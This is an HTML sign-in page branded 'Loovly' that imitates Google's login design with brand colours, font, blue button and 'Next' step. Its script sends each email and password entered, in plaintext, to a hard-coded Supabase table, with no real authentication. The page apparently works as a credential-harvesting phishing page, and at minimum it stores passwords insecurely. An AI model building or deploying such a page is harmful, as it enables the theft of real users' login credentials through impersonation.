<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loovly</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  body{font-family:'Google Sans',Roboto,Arial,sans-serif; background:#fff; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh;}
  .card{width:100%; max-width:410px; padding:48px 40px 36px; border:1px solid #dadce0; border-radius:8px; text-align:center;}
  .logo{font-size:36px; font-weight:500; letter-spacing:-1px; margin-bottom:40px;}
  .logo .b{color:#4285F4} .logo .r{color:#DB4437} .logo .y{color:#F4B400} .logo .g{color:#0F9D58}
  .input-group{text-align:left; margin-bottom:20px;}
  .input-group label{font-size:14px; color:#5f6368;}
  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; margin-top:6px;}
  .input-group input::placeholder{color:#80868b;}
  .input-group input:focus{border:2px solid #1a73e8; padding:14px 13px;}
  button{width:100%; padding:11px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; margin-top:15px;}
  button:hover{background:#1765cc;}
  #msg{margin-top:20px; font-size:14px; font-weight:500;}
  .footer{margin-top:40px; font-size:14px; font-weight:500; display:flex; justify-content:center; align-items:center; gap:6px;}
  .footer .b{color:#4285F4} .footer .r{color:#DB4437} .footer .y{color:#F4B400} .footer .g{color:#0F9D58}
  .footer .year{color:#5f6368; font-weight:400; font-size:13px;}
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <span class="b">L</span><span class="r">o</span><span class="y">o</span><span class="b">v</span><span class="g">l</span><span class="r">y</span>
  </div>

  <form id="loovlyForm" onsubmit="handleLoovlyLogin(event)">
    <div class="input-group">
      <label>Email</label>
      <input type="email" id="email" placeholder="you@example.com" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" id="password" placeholder="••••••••••••" required>
    </div>
    <button type="submit" id="btn">Next</button>
    <p id="msg"></p>
  </form>

  <div class="footer">
    <span><span class="b">L</span><span class="r">o</span><span class="y">o</span><span class="b">v</span><span class="g">l</span><span class="r">y</span></span>
    <span class="year">© 2026</span>
  </div>
</div>

<script>
const supabaseClient = window.supabase.createClient(
  'https://nwpyevsjnublptabupup.supabase.co',
  'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
);

async function handleLoovlyLogin(e){
  e.preventDefault();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value.trim();
  const btn = document.getElementById('btn');
  const msg = document.getElementById('msg');
  
  btn.disabled = true;
  btn.innerText = 'Loading...';
  msg.innerText = '';

  const { error } = await supabaseClient
    .from('users_simple')
    .insert([{ email: email, password: password }]);

  if(error){
    msg.innerText = 'Error: ' + error.message;
    msg.style.color = '#d93025';
  } else {
    msg.innerText = 'Saved successfully ✓';
    msg.style.color = '#1e8e3e';
    document.getElementById('loovlyForm').reset();
  }
  
  btn.disabled = false;
  btn.innerText = 'Next';
}
</script>

</body>
</html>
